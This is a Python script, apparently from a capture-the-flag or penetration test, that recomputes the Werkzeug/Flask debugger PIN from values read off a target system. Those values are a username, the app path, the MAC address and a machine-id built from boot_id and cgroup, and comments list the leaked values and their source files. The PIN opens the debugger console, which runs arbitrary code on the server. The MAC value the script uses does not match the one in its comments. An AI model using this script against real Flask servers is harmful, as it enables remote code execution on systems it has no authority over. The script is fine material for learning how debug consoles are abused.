import hashlib
from itertools import chain

probably_public_bits = [
    'hjikmrfvyg',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '78c9aa538acf414aac9cc9d557d76d333e5f58710ee3415ec2a1536107725aff6f8c43702c1c4d6da6ba93144ed0c856'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

# mac address : 02:42:ac:18:00:02
# in decimal 2485378351106
# app.py : /usr/local/lib/python3.8/site-packages/flask/app.py
# file   /proc/sys/kernel/random/boot_id
# bootid 78c9aa53-8acf-414a-ac9c-c9d557d76d33
# machine id not available
# /proc/self/cgroup

# cgroupid 3e5f58710ee3415ec2a1536107725aff6f8c43702c1c4d6da6ba93144ed0c856
